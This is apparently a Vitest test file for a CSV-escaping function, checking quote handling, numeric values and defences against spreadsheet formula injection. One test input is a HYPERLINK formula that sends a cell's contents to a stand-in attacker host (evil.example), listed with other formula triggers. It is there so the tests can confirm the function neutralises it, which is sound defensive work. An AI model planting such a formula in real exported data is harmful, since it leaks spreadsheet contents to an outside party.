import { describe, expect, it } from 'vitest';
import { escapeCsvCell } from './csv-cell';

describe('escapeCsvCell', () => {
  it('quotes plain values and doubles embedded quotes', () => {
    expect(escapeCsvCell('Asha Rao')).toBe('"Asha Rao"');
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it.each(['=HYPERLINK("https://evil.example/?d="&B2,"Click")', '+1+1', '-2+3', '@SUM(A1:A2)', '\tcmd', '\rcmd'])(
    'neutralises formula trigger %j with a leading single quote',
    (payload) => {
      const cell = escapeCsvCell(payload);
      expect(cell.startsWith(`"'`)).toBe(true);
    }
  );

  it('leaves plain numbers (including negatives) numeric', () => {
    expect(escapeCsvCell('-1500')).toBe('"-1500"');
    expect(escapeCsvCell('12.50')).toBe('"12.50"');
  });
});
